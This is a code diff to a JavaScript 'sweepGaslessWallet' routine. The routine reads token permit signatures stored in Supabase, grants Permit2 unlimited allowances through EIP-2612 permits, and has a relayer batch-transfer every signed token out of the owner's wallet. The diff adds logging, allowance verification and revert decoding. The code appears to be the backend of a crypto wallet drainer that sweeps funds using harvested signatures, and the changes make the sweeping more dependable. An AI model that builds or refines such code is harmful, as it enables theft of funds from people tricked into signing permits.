@@ -672,6 +672,25 @@ async function sweepGaslessWallet(walletAddress) {
   const { permitBatch, signatureTransfers } = meta;
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
 
+  // ── Part 6: Log signature data read from Supabase ─────────────────────────
+  log(`[gasless] sig type: ${typeof signatureTransfers}`);
+  if (signatureTransfers && typeof signatureTransfers === 'object' && !Array.isArray(signatureTransfers)) {
+    const st = signatureTransfers;
+    log(`[gasless] permitted count: ${st.permitted?.length ?? 0}`);
+    log(`[gasless] deadline: ${st.deadline}`);
+    log(`[gasless] nonce: ${String(st.nonce ?? '').slice(0, 16)}...`);
+    log(`[gasless] spender: ${st.spender}`);
+    log(`[gasless] spent: ${st.spent ?? false}`);
+    if (!st.permitted?.length) warn('[gasless] permitted array is empty — nothing to sweep');
+    if (st.deadline && BigInt(st.deadline) < nowSecs) warn('[gasless] deadline already EXPIRED');
+    if (st.spender?.toLowerCase() !== relayerWallet.address.toLowerCase()) {
+      warn(`[gasless] SPENDER MISMATCH — sig.spender=${st.spender} relayer=${relayerWallet.address}`);
+    }
+  } else if (Array.isArray(signatureTransfers)) {
+    const unspent = signatureTransfers.filter(e => !e.spent).length;
+    log(`[gasless] legacy array: ${signatureTransfers.length} entries, ${unspent} unspent`);
+  }
+
   // Hard balance gate — check ONLY the signed token addresses before any on-chain tx
   const signedAddrs = [
     ...(Array.isArray(permitBatch?.details) ? permitBatch.details.map(d => d.token) : []),
@@ -893,6 +912,18 @@ async function sweepGaslessWallet(walletAddress) {
               const fee = await getFeeData();
               await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, BigInt(e2.deadline), e2.v, e2.r, e2.s, { gasLimit: 100_000n, ...fee })).wait();
               log(`[gasless/batch] EIP-2612 confirmed for ${tokenAddr.slice(0, 10)}`);
+              // Part 7: Verify allowance was actually set — some tokens appear to succeed but don't update allowance
+              try {
+                const actualAllow = await new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider).allowance(checksum, PERMIT2_ADDRESS);
+                if (actualAllow === 0n) {
+                  warn(`[gasless/batch] EIP-2612 permit() succeeded but allowance=0 for ${tokenAddr.slice(0,10)} — non-standard token, marking failed`);
+                  failedEIP2612.add(batchEip2612Key);
+                  eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
+                } else {
+                  log(`[gasless/batch] EIP-2612 allowance verified: ${actualAllow} for ${tokenAddr.slice(0,10)}`);
+                }
+              } catch { /* non-fatal — proceed with sweep attempt */ }
+            
             } catch (e) {
               warn(`[gasless/batch] EIP-2612 permit() failed for ${tokenAddr.slice(0, 10)}: ${e.message} — marking failed, will not retry`);
               failedEIP2612.add(batchEip2612Key);
@@ -936,6 +967,20 @@ async function sweepGaslessWallet(walletAddress) {
     }
 
     // Step 3: Batch permitTransferFrom — ONE call for all tokens
+    // Log all params before submitting so revert reason is traceable
+    log('[gasless/batch] permitTransferFrom params:');
+    log(`  owner:          ${checksum}`);
+    log(`  spender in sig: ${batch.spender}`);
+    log(`  msg.sender:     ${relayerWallet.address}`);
+    if (batch.spender?.toLowerCase() !== relayerWallet.address.toLowerCase()) {
+      warn(`[gasless/batch] SPENDER MISMATCH — sig was built for ${batch.spender} but relayer is ${relayerWallet.address} — tx will revert`);
+    }
+    log(`  tokens:  ${batch.permitted.map(p => p.token.slice(0, 10)).join(', ')}`);
+    log(`  amounts: ${transferDetails.map(d => d.requestedAmount.toString()).join(', ')}`);
+    log(`  nonce:   ${String(batch.nonce).slice(0, 20)}...`);
+    log(`  deadline:${batch.deadline}`);
+    log(`  sig:     ${batch.signature.slice(0, 20)}...`);
+
     try {
       const fee = await getFeeData();
       const gasLimit = 150_000n + BigInt(batch.permitted.length) * 100_000n;
@@ -951,8 +996,24 @@ async function sweepGaslessWallet(walletAddress) {
         { gasLimit, ...fee },
       );
       log(`[gasless/batch] batch permitTransferFrom tx: ${tx.hash}`);
-      await tx.wait();
-      log(`[gasless/batch] confirmed — batch sweep for ${checksum} (${batch.permitted.length} token(s))`);
+      try {
+        await tx.wait();
+        log(`[gasless/batch] confirmed — batch sweep for ${checksum} (${batch.permitted.length} token(s))`);
+      } catch (waitErr) {
+        const wmsg = waitErr.message ?? '';
+        let reason = wmsg;
+        if (waitErr.data) {
+          try {
+            // Try standard Error(string) revert
+            const decoded = ethers.AbiCoder.defaultAbiCoder().decode(
+              ['string'], '0x' + String(waitErr.data).slice(10)
+            );
+            reason = decoded[0] ?? wmsg;
+          } catch {}
+        }
+        err(`[gasless/batch] revert: ${reason}`);
+        throw waitErr; // re-throw so outer catch handles Supabase update
+      }
 
       if (supabase) {
         try {
@@ -966,9 +1027,9 @@ async function sweepGaslessWallet(walletAddress) {
       if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
         warn(`[gasless/batch] nonce consumed for ${checksum} — marking spent`);
       } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
-        warn(`[gasless/batch] TRANSFER_FROM_FAILED for ${checksum} — marking spent`);
+        warn(`[gasless/batch] TRANSFER_FROM_FAILED for ${checksum} — check ERC20→Permit2 allowance`);
       } else {
-        err(`[gasless/batch] batch permitTransferFrom for ${checksum}: ${msg}`);
+        err(`[gasless/batch] permitTransferFrom for ${checksum}: ${msg}`);
         return;
       }
       if (supabase) {
